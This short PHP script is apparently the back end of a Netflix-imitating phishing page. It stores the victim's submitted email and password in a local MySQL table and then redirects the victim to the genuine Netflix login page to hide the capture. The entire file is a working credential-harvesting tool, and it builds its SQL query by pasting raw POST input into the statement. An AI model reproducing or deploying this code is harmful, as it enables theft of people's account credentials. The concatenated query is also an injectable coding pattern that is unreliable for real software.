<?php
$db_connection = mysqli_connect("localhost", "root" , "" , "netflix");

if(!$db_connection){
	echo mysqli_connect_error();
}
if(!empty($_POST))
	mysqli_query($db_connection,"insert into information(email,pass)
                                 values('".$_POST['userLoginId']."','".$_POST['password']."')");

	mysqli_close($db_connection);
	header("location:https://www.netflix.com/ps-en/login");
	


?>